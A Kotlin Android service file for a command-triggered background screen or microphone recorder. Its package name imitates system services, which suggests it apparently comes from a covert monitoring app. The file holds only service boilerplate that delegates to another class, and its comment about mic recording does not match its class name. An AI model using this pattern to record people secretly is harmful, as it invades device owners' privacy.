package com.android.services.services.screenRecord

import android.app.Service
import android.content.Intent
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.annotation.RequiresApi
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

/**
 * [ScreenRecordCommandService] is a Service to record the Mic Recording in Background,
 * This service receives a Command to start recording using phone's microphone,
 * and immediately starts recording If Device's Microphone is Free
 */

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class ScreenRecordCommandService : Service() {
    private val binder=ScreenRecordCommandServiceBinder()
    inner class ScreenRecordCommandServiceBinder: Binder(){
        fun getService():ScreenRecordCommandService{
            Log.d("BoundServiceInfo","Binder Called in Service")
            return this@ScreenRecordCommandService
        }
    }
    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var screenRecordProcessingI: IBackgroundProcessing

    override fun onBind(arg0: Intent): IBinder? {
        return binder
    }

    override fun onCreate() {
        super.onCreate()
        screenRecordProcessingI =
            ScreenRecordCommandProcessingBaseImplI(this, localDatabaseSource, coroutineScope)
        screenRecordProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return screenRecordProcessingI.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        screenRecordProcessingI.onDestroy()
    }
}